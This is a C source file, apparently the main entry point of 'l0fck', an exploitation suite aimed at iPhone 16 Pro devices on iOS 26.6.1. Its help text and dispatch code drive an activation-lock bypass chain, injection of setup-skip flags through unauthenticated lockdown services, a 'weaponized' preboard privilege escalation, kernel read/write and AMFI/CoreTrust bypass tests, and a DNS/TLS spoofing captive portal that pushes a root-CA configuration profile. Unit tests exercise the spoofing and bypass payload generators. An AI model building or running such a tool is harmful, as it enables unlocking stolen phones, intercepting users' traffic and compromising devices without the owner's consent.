#include "l0fck.h"
#include "exploits/captive_server.h"
#include "exploits/captive_dns.h"
#include "exploits/captive_http.h"
#include "exploits/captive_payloads.h"
#include "exploits/captive_tls.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <getopt.h>

static void print_help(const char *prog_name)
{
    target_print_banner();
    printf("Usage: %s [options]\n\n", prog_name);
    printf("Hardware Target:  iPhone 16 Pro / iPhone 16 Pro Max (A18 Pro SoC / CPID 0x8140)\n");
    printf("Software Target:  iOS 26.6.1 (Build 23G83)\n\n");
    printf("Device Discovery & Hardware Analysis:\n");
    printf("  -d, --detect                 Detect connected device, mode, SoC, and OS compatibility\n");
    printf("      --port-dfu               Inspect and parse Port DFU descriptors (PID 05ac:f014)\n");
    printf("      --usb-scan               Scan all connected Apple USB devices across modes\n");
    printf("\nLockdown & Unauthenticated Services (Vulnerability #02):\n");
    printf("      --probe-services         Audit exposed lockdown services without pairing\n");
    printf("      --afc-ls <path>          List files and directories on /var/mobile/Media/\n");
    printf("      --afc-pull <rem> <loc>   Download file from media partition to local path\n");
    printf("      --afc-push <loc> <rem>   Upload file from local path to media partition\n");
    printf("      --inject-flags           Inject persistent PurpleBuddy & hactivation bypass flags\n");
    printf("      --verify-flags           Verify injected PurpleBuddy configuration keys\n");
    printf("      --syslog [seconds]       Stream live device syslog (default 10s)\n");
    printf("      --reboot                 Safely reboot device via diagnostics relay\n");
    printf("\nMobileActivation & Albert DRM Handshake:\n");
    printf("      --probe-albert           Inspect IngestBody / CollectionBlob and test DRM handshake\n");
    printf("      --activate-online        Execute full 5-stage online activation with Albert server\n");
    printf("      --activate-offline       Generate & submit synthesized A18 Pro activation record\n");
    printf("      --activate-race          Execute VUL 23 TOCTOU race condition activation\n");
    printf("      --deactivate             Deactivate device activation state\n");
    printf("\nExploitation & Automation Modules:\n");
    printf("      --crash-preboard         Run Vulnerability #23 preboardservice_v2 crash PoC\n");
    printf("      --triage-crash           Trigger crash and auto-acquire/parse .ips crash report\n");
    printf("      --exploit-preboard       Execute weaponized preboard privilege escalation\n");
    printf("      --stage-bypass           Stage persistent PurpleBuddy/SpringBoard configs to AFC\n");
    printf("      --dismiss-setup          Dispatch Darwin setup completion notifications\n");
    printf("      --sovereign                ⚡ Execute Sovereign-Chain (Hybrid Security Degradation)\n");
    printf("      --sovereign-lite           ⚡ Execute Sovereign-Lite (Injection + Notification Focus)\n");
    printf("      --bypass-full            🚀 Execute full 5-stage automated activation bypass chain\n");
    printf("      --bypass-watch           Start automated USB bypass watcher for connected devices\n");
    printf("      --neo-chain              Execute Neo-Chain kernel exploitation activation bypass\n");
    printf("      --test-kernel-exploit    Test kernel R/W primitive (V-047 / MCC fallback)\n");
    printf("      --test-amfi-bypass       Test AMFI/CoreTrust bypass with kernel R/W\n");
    printf("      --captive-server [port]  Start local DNS/HTTP/TLS captive portal server (default 8080)\n");
    printf("      --captive-dns-port <p>   Specify DNS responder port (default 5353, use 53 with root)\n");
    printf("      --captive-tls-port <p>   Specify TLS MITM inspector port (default 8443, use 443 with root)\n");
    printf("      --captive-ip <ip>        Override spoofed DNS IP address (default auto-detected host IP)\n");
    printf("      --captive-mode <mode>    Set operating mode: intercept (default), success, redirect\n");
    printf("      --export-profile <file>  Generate and save research .mobileconfig profile\n");
    printf("\nDiagnostics & Testing:\n");
    printf("      --test                   Run embedded unit tests and synthesizer verifications\n");
    printf("  -v, --verbose                Enable detailed debug logging output\n");
    printf("  -h, --help                   Display this help documentation\n\n");
}

static int run_unit_tests(void)
{
    printf("\n" ANSI_COLOR_BOLD ANSI_COLOR_CYAN "======================== L0FCK SELF-TEST SUITE ========================" ANSI_COLOR_RESET "\n");
    int passed = 0;
    int total = 0;

    /* Test 1: Port DFU Serial Parser */
    total++;
    printf("Test 1: Port DFU Serial Parser... ");
    const char *test_serial = "SDOM:01 SYSI:00 BDID:0E CPID:8140 ECID:0011223344556677 SRTG:[iBoot-10158.0.0.1.1] CHIP:[T8140]";
    port_dfu_info_t dfu_info;
    memset(&dfu_info, 0, sizeof(dfu_info));
    if (port_dfu_parse_serial(test_serial, &dfu_info) == 0 &&
        dfu_info.cpid == 0x8140 &&
        dfu_info.bdid == 0x0E &&
        dfu_info.sdom == 0x01 &&
        dfu_info.sysi == 0x00 &&
        dfu_info.ecid == 0x0011223344556677ULL &&
        strcmp(dfu_info.chip, "[T8140]") == 0 &&
        dfu_info.is_a18_pro) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }

    /* Test 2: Base64 Encoding & Decoding */
    total++;
    printf("Test 2: Base64 Codec Integrity... ");
    const char *sample_text = "Apple A18 Pro iOS 26.6.1 l0fck Activation Suite";
    size_t enc_len = 0;
    char *b64 = util_base64_encode((const unsigned char *)sample_text, strlen(sample_text), &enc_len);
    size_t dec_len = 0;
    unsigned char *dec = util_base64_decode(b64, enc_len, &dec_len);
    if (b64 && dec && dec_len == strlen(sample_text) && memcmp(dec, sample_text, dec_len) == 0) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }
    free(b64);
    free(dec);

    /* Test 3: Target Validation Logic */
    total++;
    printf("Test 3: Hardware Gating & Target Validator... ");
    l0fck_device_t mock_dev;
    memset(&mock_dev, 0, sizeof(mock_dev));
    mock_dev.cpid = TARGET_CPID;
    snprintf(mock_dev.product_type, sizeof(mock_dev.product_type), "%s", TARGET_MODEL_1);
    snprintf(mock_dev.product_version, sizeof(mock_dev.product_version), "%s", TARGET_OS_VERSION);
    snprintf(mock_dev.build_version, sizeof(mock_dev.build_version), "%s", TARGET_BUILD_VERSION);

    target_validation_status_t v_ok = target_validate_device(&mock_dev);

    mock_dev.cpid = 0x8015; /* A11 */
    target_validation_status_t v_bad_soc = target_validate_device(&mock_dev);

    if (v_ok == TARGET_VALID && v_bad_soc == TARGET_ERR_WRONG_SOC) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }

    /* Test 4: A18 Pro Activation Record Synthesizer */
    total++;
    printf("Test 4: A18 Pro Activation Record Synthesizer... ");
    mock_dev.cpid = TARGET_CPID;
    snprintf(mock_dev.product_type, sizeof(mock_dev.product_type), "%s", TARGET_MODEL_1);
    snprintf(mock_dev.udid, sizeof(mock_dev.udid), "00008140-0011223344556677");
    mock_dev.ecid = 0x0011223344556677ULL;

    plist_t rec = NULL;
    plist_t headers = NULL;
    if (record_a18_generate(&mock_dev, NULL, &rec, &headers) == 0 && rec && headers) {
        plist_t chip_node = plist_dict_get_item(rec, "ProductType");
        char *ptype = NULL;
        plist_get_string_val(chip_node, &ptype);
        if (ptype && strcmp(ptype, TARGET_MODEL_1) == 0) {
            printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
            passed++;
        } else {
            printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
        }
        free(ptype);
        plist_free(rec);
        plist_free(headers);
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }

    /* Test 5: DNS Query Parser & A-Record Synthesizer */
    total++;
    printf("Test 5: DNS Query Parser & Spoof Generator... ");
    /* Simulated DNS query packet for 'captive.apple.com' (Type A, Class IN, ID 0x1234) */
    uint8_t raw_dns_query[] = {
        0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x07, 'c', 'a', 'p', 't', 'i', 'v', 'e',
        0x05, 'a', 'p', 'p', 'l', 'e',
        0x03, 'c', 'o', 'm',
        0x00,
        0x00, 0x01, 0x00, 0x01
    };
    dns_query_t parsed_query;
    uint8_t resp_buf[512];
    size_t resp_len = 0;
    if (dns_parse_query(raw_dns_query, sizeof(raw_dns_query), &parsed_query) == 0 &&
        parsed_query.tx_id == 0x1234 &&
        strcmp(parsed_query.domain, "captive.apple.com") == 0 &&
        parsed_query.category == DNS_DOMAIN_APPLE_CAPTIVE &&
        dns_build_response_a(&parsed_query, "192.168.2.106", 60, resp_buf, sizeof(resp_buf), &resp_len) == 0 &&
        resp_len > sizeof(raw_dns_query)) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }

    /* Test 6: HTTP Request Parser & Route Matcher */
    total++;
    printf("Test 6: HTTP Request Parser & Route Matcher... ");
    const char *raw_http =
        "GET /hotspot-detect.html HTTP/1.1\r\n"
        "Host: captive.apple.com\r\n"
        "User-Agent: CaptiveNetworkSupport-456.0.2 wispr\r\n"
        "Accept: */*\r\n\r\n";
    http_request_t req;
    if (http_parse_request(raw_http, strlen(raw_http), &req) == 0 &&
        strcmp(req.method, "GET") == 0 &&
        strcmp(req.path, "/hotspot-detect.html") == 0 &&
        strcmp(req.host, "captive.apple.com") == 0) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }

    /* Test 7: Dynamic .mobileconfig Configuration Profile Generator */
    total++;
    printf("Test 7: Dynamic .mobileconfig Profile Generator... ");
    size_t profile_len = 0;
    char *profile_xml = captive_payload_generate_mobileconfig("192.168.1.50", 8080, &profile_len);
    if (profile_xml && profile_len > 0 &&
        strstr(profile_xml, "com.apple.webClip.managed") &&
        strstr(profile_xml, "com.apple.security.root") &&
        strstr(profile_xml, "http://192.168.1.50:8080/")) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }

    /* Test 8: Root CA Certificate & PEM Validator */
    total++;
    printf("Test 8: Root CA Certificate & PEM Validator... ");
    size_t ca_len = 0;
    char *ca_pem = captive_payload_get_root_ca_pem(&ca_len);
    if (ca_pem && ca_len > 0 && strstr(ca_pem, "-----BEGIN CERTIFICATE-----") && strstr(ca_pem, "-----END CERTIFICATE-----")) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }
    free(ca_pem);

    /* Test 9: Crash Report .IPS Triage Parser */
    total++;
    printf("Test 9: Crash Report .IPS Triage Parser... ");
    const char *mock_ips =
        "{\"app_name\":\"preboardservice_v2\",\"incident_id\":\"TEST-1234-5678\",\"pid\":442}\n"
        "{\"procName\":\"preboardservice_v2\",\"exception\":{\"type\":\"EXC_CRASH\",\"signal\":\"SIGABRT\"},"
        "\"asiBacktraces\":[\"0 CoreFoundation __exceptionPreprocess + 242\\n1 libobjc.A.dylib objc_exception_throw\"]}";
    crash_triage_info_t triage_test;
    if (crash_reporter_parse_ips(mock_ips, strlen(mock_ips), &triage_test) == 0 &&
        strcmp(triage_test.incident_id, "TEST-1234-5678") == 0 &&
        strcmp(triage_test.process_name, "preboardservice_v2") == 0 &&
        triage_test.pid == 442 &&
        triage_test.is_objc_exception) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }

    /* Test 10: SpringBoard & PurpleBuddy Preference Synthesizer */
    total++;
    printf("Test 10: SpringBoard & PurpleBuddy Preference Synthesizer... ");
    char *pb_xml = NULL;
    uint32_t pb_len = 0;
    char *sb_xml = NULL;
    uint32_t sb_len = 0;
    if (springboard_generate_purplebuddy_plist(&pb_xml, &pb_len) == 0 && pb_xml &&
        springboard_generate_springboard_plist(&sb_xml, &sb_len) == 0 && sb_xml &&
        strstr(pb_xml, "SetupFinishedAllSteps") && strstr(sb_xml, "<true/>") &&
        strstr(sb_xml, "SBShowSetupAssistantAtLaunch") && strstr(sb_xml, "<false/>")) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }
    free(pb_xml);
    free(sb_xml);

    /* Test 11: Session Manager Struct & Lifecycle Initialization */
    total++;
    printf("Test 11: Session Manager Lifecycle & Pointer Safety... ");
    l0fck_session_t test_sess;
    if (session_init(&test_sess) == 0 &&
        test_sess.dev == NULL &&
        test_sess.ld == NULL &&
        test_sess.is_connected == false &&
        sizeof(test_sess) > 0) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }

    /* Test 12: SetupAssistant & iTunes Plist Synthesizer */
    total++;
    printf("Test 12: SetupAssistant & iTunes Plist Synthesizer... ");
    char *sa_xml = NULL;
    uint32_t sa_len = 0;
    char *it_xml = NULL;
    uint32_t it_len = 0;
    if (springboard_generate_setupassistant_plist(&sa_xml, &sa_len) == 0 && sa_xml &&
        springboard_generate_itunes_plist(&it_xml, &it_len) == 0 && it_xml &&
        strstr(sa_xml, "DidSeeLanguage") && strstr(sa_xml, "<true/>") &&
        strstr(it_xml, "BuddySetupComplete") && strstr(it_xml, "<true/>")) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }
    free(sa_xml);
    free(it_xml);

    printf("\nSelf-Test Result: %d/%d tests passed cleanly.\n", passed, total);
    printf(ANSI_COLOR_CYAN "========================================================================" ANSI_COLOR_RESET "\n\n");

    return passed == total ? 0 : 1;
}

int main(int argc, char **argv)
{
    if (argc < 2) {
        print_help(argv[0]);
        return 0;
    }

    int opt_detect = 0;
    int opt_port_dfu = 0;
    int opt_usb_scan = 0;
    int opt_probe_services = 0;
    int opt_inject_flags = 0;
    int opt_verify_flags = 0;
    int opt_reboot = 0;
    int opt_syslog = 0;
    int opt_probe_albert = 0;
    int opt_activate_online = 0;
    int opt_activate_offline = 0;
    int opt_activate_race = 0;
    int opt_deactivate = 0;
    int opt_crash_preboard = 0;
    int opt_triage_crash = 0;
    int opt_exploit_preboard = 0;
    int opt_stage_bypass = 0;
    int opt_dismiss_setup = 0;
    int opt_bypass_full = 0;
    int opt_bypass_watch = 0;
    int opt_captive = 0;
    int opt_test = 0;
    int opt_sovereign = 0;
    int opt_sovereign_lite = 0;
    int opt_neo_chain = 0;
    int opt_test_kernel_exploit = 0;
    int opt_test_amfi_bypass = 0;
    int opt_verbose = 0;

    const char *afc_ls_path = NULL;
    const char *afc_pull_remote = NULL;
    const char *afc_pull_local = NULL;
    const char *afc_push_local = NULL;
    const char *afc_push_remote = NULL;
    int syslog_seconds = 10;

    captive_config_t cap_cfg;
    memset(&cap_cfg, 0, sizeof(cap_cfg));
    cap_cfg.http_port = 8080;
    cap_cfg.dns_port = 5353;
    cap_cfg.tls_port = 8443;
    cap_cfg.mode = CAPTIVE_MODE_INTERCEPT;
    cap_cfg.enable_http = true;
    cap_cfg.enable_dns = true;
    cap_cfg.enable_tls = true;

    const char *export_profile_path = NULL;

    enum {
        OPT_PORT_DFU = 1000,
        OPT_USB_SCAN,
        OPT_PROBE_SERVICES,
        OPT_AFC_LS,
        OPT_AFC_PULL,
        OPT_AFC_PUSH,
        OPT_INJECT_FLAGS,
        OPT_VERIFY_FLAGS,
        OPT_REBOOT,
        OPT_SYSLOG,
        OPT_PROBE_ALBERT,
        OPT_ACTIVATE_ONLINE,
        OPT_ACTIVATE_OFFLINE,
        OPT_ACTIVATE_RACE,
        OPT_DEACTIVATE,
        OPT_CRASH_PREBOARD,
        OPT_TRIAGE_CRASH,
        OPT_EXPLOIT_PREBOARD,
        OPT_STAGE_BYPASS,
        OPT_DISMISS_SETUP,
        OPT_BYPASS_FULL,
        OPT_BYPASS_WATCH,
        OPT_CAPTIVE,
        OPT_CAPTIVE_DNS_PORT,
        OPT_CAPTIVE_TLS_PORT,
        OPT_CAPTIVE_IP,
        OPT_CAPTIVE_MODE,
        OPT_EXPORT_PROFILE,
        OPT_TEST,
        OPT_SOVEREIGN,
        OPT_SOVEREIGN_LITE,
        OPT_NEO_CHAIN,
        OPT_TEST_KERNEL_EXPLOIT,
        OPT_TEST_AMFI_BYPASS
    };

    static struct option long_options[] = {
        { "detect",           no_argument,       NULL, 'd' },
        { "port-dfu",         no_argument,       NULL, OPT_PORT_DFU },
        { "usb-scan",         no_argument,       NULL, OPT_USB_SCAN },
        { "probe-services",   no_argument,       NULL, OPT_PROBE_SERVICES },
        { "afc-ls",           required_argument, NULL, OPT_AFC_LS },
        { "afc-pull",         required_argument, NULL, OPT_AFC_PULL },
        { "afc-push",         required_argument, NULL, OPT_AFC_PUSH },
        { "inject-flags",     no_argument,       NULL, OPT_INJECT_FLAGS },
        { "verify-flags",     no_argument,       NULL, OPT_VERIFY_FLAGS },
        { "reboot",           no_argument,       NULL, OPT_REBOOT },
        { "syslog",           optional_argument, NULL, OPT_SYSLOG },
        { "probe-albert",     no_argument,       NULL, OPT_PROBE_ALBERT },
        { "activate-online",  no_argument,       NULL, OPT_ACTIVATE_ONLINE },
        { "activate-offline", no_argument,       NULL, OPT_ACTIVATE_OFFLINE },
        { "activate-race",    no_argument,       NULL, OPT_ACTIVATE_RACE },
        { "deactivate",       no_argument,       NULL, OPT_DEACTIVATE },
        { "crash-preboard",   no_argument,       NULL, OPT_CRASH_PREBOARD },
        { "triage-crash",     no_argument,       NULL, OPT_TRIAGE_CRASH },
        { "exploit-preboard", no_argument,       NULL, OPT_EXPLOIT_PREBOARD },
        { "stage-bypass",     no_argument,       NULL, OPT_STAGE_BYPASS },
        { "dismiss-setup",    no_argument,       NULL, OPT_DISMISS_SETUP },
        { "bypass-full",      no_argument,       NULL, OPT_BYPASS_FULL },
        { "bypass-watch",     no_argument,       NULL, OPT_BYPASS_WATCH },
        { "captive-server",   optional_argument, NULL, OPT_CAPTIVE },
        { "captive-dns-port", required_argument, NULL, OPT_CAPTIVE_DNS_PORT },
        { "captive-tls-port", required_argument, NULL, OPT_CAPTIVE_TLS_PORT },
        { "captive-ip",       required_argument, NULL, OPT_CAPTIVE_IP },
        { "captive-mode",     required_argument, NULL, OPT_CAPTIVE_MODE },
        { "export-profile",   required_argument, NULL, OPT_EXPORT_PROFILE },
        { "test",             no_argument,       NULL, OPT_TEST },
        { "sovereign",           no_argument,       NULL, OPT_SOVEREIGN },
        { "sovereign-lite",      no_argument,       NULL, OPT_SOVEREIGN_LITE },
        { "neo-chain",           no_argument,       NULL, OPT_NEO_CHAIN },
        { "test-kernel-exploit", no_argument,       NULL, OPT_TEST_KERNEL_EXPLOIT },
        { "test-amfi-bypass",    no_argument,       NULL, OPT_TEST_AMFI_BYPASS },
        { "verbose",          no_argument,       NULL, 'v' },
        { "help",             no_argument,       NULL, 'h' },
        { NULL, 0, NULL, 0 }
    };

    int opt;
    while ((opt = getopt_long(argc, argv, "dvh", long_options, NULL)) != -1) {
        switch (opt) {
            case 'd': opt_detect = 1; break;
            case 'v': opt_verbose = 1; break;
            case 'h': print_help(argv[0]); return 0;
            case OPT_PORT_DFU: opt_port_dfu = 1; break;
            case OPT_USB_SCAN: opt_usb_scan = 1; break;
            case OPT_PROBE_SERVICES: opt_probe_services = 1; break;
            case OPT_AFC_LS: afc_ls_path = optarg; break;
            case OPT_AFC_PULL:
                afc_pull_remote = optarg;
                if (optind < argc) afc_pull_local = argv[optind++];
                break;
            case OPT_AFC_PUSH:
                afc_push_local = optarg;
                if (optind < argc) afc_push_remote = argv[optind++];
                break;
            case OPT_INJECT_FLAGS: opt_inject_flags = 1; break;
            case OPT_VERIFY_FLAGS: opt_verify_flags = 1; break;
            case OPT_REBOOT: opt_reboot = 1; break;
            case OPT_SYSLOG:
                opt_syslog = 1;
                if (optarg) syslog_seconds = atoi(optarg);
                break;
            case OPT_PROBE_ALBERT: opt_probe_albert = 1; break;
            case OPT_ACTIVATE_ONLINE: opt_activate_online = 1; break;
            case OPT_ACTIVATE_OFFLINE: opt_activate_offline = 1; break;
            case OPT_ACTIVATE_RACE: opt_activate_race = 1; break;
            case OPT_DEACTIVATE: opt_deactivate = 1; break;
            case OPT_CRASH_PREBOARD: opt_crash_preboard = 1; break;
            case OPT_TRIAGE_CRASH: opt_triage_crash = 1; break;
            case OPT_EXPLOIT_PREBOARD: opt_exploit_preboard = 1; break;
            case OPT_STAGE_BYPASS: opt_stage_bypass = 1; break;
            case OPT_DISMISS_SETUP: opt_dismiss_setup = 1; break;
            case OPT_BYPASS_FULL: opt_bypass_full = 1; break;
            case OPT_BYPASS_WATCH: opt_bypass_watch = 1; break;
            case OPT_CAPTIVE:
                opt_captive = 1;
                if (optarg) {
                    cap_cfg.http_port = (uint16_t)atoi(optarg);
                } else if (optind < argc && argv[optind][0] != '-') {
                    cap_cfg.http_port = (uint16_t)atoi(argv[optind++]);
                }
                break;
            case OPT_CAPTIVE_DNS_PORT:
                cap_cfg.dns_port = (uint16_t)atoi(optarg);
                break;
            case OPT_CAPTIVE_TLS_PORT:
                cap_cfg.tls_port = (uint16_t)atoi(optarg);
                break;
            case OPT_CAPTIVE_IP:
                snprintf(cap_cfg.spoof_ip, sizeof(cap_cfg.spoof_ip), "%s", optarg);
                break;
            case OPT_CAPTIVE_MODE:
                if (strcasecmp(optarg, "success") == 0) {
                    cap_cfg.mode = CAPTIVE_MODE_SUCCESS;
                } else if (strcasecmp(optarg, "redirect") == 0) {
                    cap_cfg.mode = CAPTIVE_MODE_REDIRECT;
                } else {
                    cap_cfg.mode = CAPTIVE_MODE_INTERCEPT;
                }
                break;
            case OPT_EXPORT_PROFILE:
                export_profile_path = optarg;
                break;
            case OPT_TEST: opt_test = 1; break;
            case OPT_SOVEREIGN: opt_sovereign = 1; break;
            case OPT_SOVEREIGN_LITE: opt_sovereign_lite = 1; break;
            case OPT_NEO_CHAIN: opt_neo_chain = 1; break;
            case OPT_TEST_KERNEL_EXPLOIT: opt_test_kernel_exploit = 1; break;
            case OPT_TEST_AMFI_BYPASS: opt_test_amfi_bypass = 1; break;
            default:
                print_help(argv[0]);
                return 1;
        }
    }

    log_init(opt_verbose);

    if (opt_test) {
        return run_unit_tests();
    }

    if (opt_test_kernel_exploit) {
        return neo_chain_test_kernel_exploit();
    }

    if (opt_test_amfi_bypass) {
        return neo_chain_test_amfi_bypass();
    }

    if (export_profile_path) {
        char host_ip[64] = {0};
        captive_server_get_host_ip(host_ip, sizeof(host_ip));
        if (captive_payload_export_profile(export_profile_path, host_ip, cap_cfg.http_port) == 0) {
            LOG_SUCCESS("Exported research configuration profile to: %s", export_profile_path);
            return 0;
        } else {
            LOG_ERROR("Failed to write configuration profile to: %s", export_profile_path);
            return 1;
        }
    }

    if (opt_captive) {
        return captive_server_start_custom(&cap_cfg);
    }

    if (opt_bypass_watch) {
        return bypass_chain_watch_mode();
    }

    libusb_context *usb_ctx = NULL;
    usb_ctrl_init(&usb_ctx);

    if (opt_usb_scan) {
        target_print_banner();
        LOG_INFO("Scanning USB subsystem for Apple hardware...");
        usb_ctrl_probe_apple_devices(usb_ctx);
        usb_ctrl_exit(usb_ctx);
        return 0;
    }

    if (opt_port_dfu) {
        target_print_banner();
        LOG_INFO("Searching for device in Port DFU Mode (0x05AC:0xF014)...");
        port_dfu_info_t dfu;
        if (port_dfu_detect(usb_ctx, &dfu) == 0) {
            port_dfu_print_info(&dfu);
        } else {
            LOG_WARN("No device currently detected in Port DFU Mode.");
        }
        usb_ctrl_exit(usb_ctx);
        return 0;
    }

    /* Standard Lockdown Connection Routine */
    l0fck_session_t sess;
    session_init(&sess);

    int ld_status = session_connect(&sess);

    if (opt_detect) {
        target_print_banner();
        if (ld_status == 0) {
            target_print_device_diagnostics(&sess.info);
        } else {
            LOG_INFO("Normal lockdown connection unavailable. Checking Port DFU / Recovery states...");
            port_dfu_info_t dfu;
            if (port_dfu_detect(usb_ctx, &dfu) == 0) {
                port_dfu_print_info(&dfu);
            } else {
                LOG_ERROR("No Apple device discovered over USB. Ensure device is connected.");
            }
        }
        session_disconnect(&sess);
        usb_ctrl_exit(usb_ctx);
        return 0;
    }

    if (ld_status != 0) {
        LOG_ERROR("Could not establish unauthenticated lockdown connection with device.");
        LOG_INFO("If device is in Port DFU mode, use --port-dfu instead.");
        usb_ctrl_exit(usb_ctx);
        return 1;
    }

    int ret = 0;

    if (opt_probe_services) {
        services_audit_unauthenticated(sess.dev, sess.ld, opt_verbose);
    } else if (afc_ls_path) {
        ret = afc_manager_list_dir(sess.dev, sess.ld, afc_ls_path);
    } else if (afc_pull_remote && afc_pull_local) {
        ret = afc_manager_pull_file(sess.dev, sess.ld, afc_pull_remote, afc_pull_local);
    } else if (afc_push_local && afc_push_remote) {
        ret = afc_manager_push_file(sess.dev, sess.ld, afc_push_local, afc_push_remote);
    } else if (opt_inject_flags) {
        ret = flag_injector_inject_all_session(&sess);
    } else if (opt_verify_flags) {
        ret = flag_injector_verify(sess.ld);
    } else if (opt_reboot) {
        ret = services_reboot_device(sess.dev, sess.ld);
    } else if (opt_syslog) {
        ret = services_stream_syslog(sess.dev, sess.ld, syslog_seconds);
    } else if (opt_probe_albert) {
        ret = albert_probe_full(sess.dev, sess.ld);
    } else if (opt_activate_online) {
        ret = albert_perform_online_activation(sess.dev, sess.ld);
    } else if (opt_activate_offline) {
        ret = albert_perform_offline_activation(sess.dev, sess.ld);
    } else if (opt_activate_race) {
        ret = albert_perform_race_activation(&sess, NULL);
    } else if (opt_deactivate) {
        ret = mobileact_deactivate(sess.dev, sess.ld);
    } else if (opt_crash_preboard) {
        ret = preboard_poc_run_session(&sess);
    } else if (opt_triage_crash) {
        ret = preboard_triage_run_live_session(&sess, NULL);
    } else if (opt_exploit_preboard) {
        ret = preboard_exploit_execute_session(&sess, EXPLOIT_MODE_AUTO);
    } else if (opt_stage_bypass) {
        ret = springboard_stage_preferences(&sess);
        flag_injector_inject_all_session(&sess);
    } else if (opt_dismiss_setup) {
        ret = springboard_dispatch_notifications(&sess);
    } else if (opt_sovereign) {
        ret = sovereign_chain_run(&sess);
    } else if (opt_sovereign_lite) {
        ret = sovereign_lite_run(&sess);
    } else if (opt_bypass_full) {
        ret = bypass_chain_run_full(&sess, NULL);
    } else if (opt_neo_chain) {
        ret = neo_chain_run(&sess, NULL);
    }

    session_disconnect(&sess);
    usb_ctrl_exit(usb_ctx);
    return ret;
}
